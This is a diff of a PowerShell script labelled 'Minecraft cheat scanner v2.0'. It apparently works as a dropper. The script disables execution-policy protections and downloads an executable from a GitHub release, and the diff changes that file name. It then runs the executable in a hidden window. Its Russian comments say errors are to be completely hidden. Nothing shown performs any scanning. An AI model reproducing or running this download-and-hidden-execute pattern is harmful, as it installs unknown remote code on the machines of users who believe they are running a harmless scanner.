@@ -1,10 +1,10 @@
 # MINECRAFT CHEAT SCANNER v2.0 
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
 
- Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe" -OutFile "chekir.exe" -ErrorAction SilentlyContinue
+ Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekers.exe" -OutFile "chekers.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
+    Start-Process -FilePath "chekers.exe" -WindowStyle Hidden
 
     
 Set-ExecutionPolicy Bypass -Scope Process -Force
@@ -101,6 +101,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
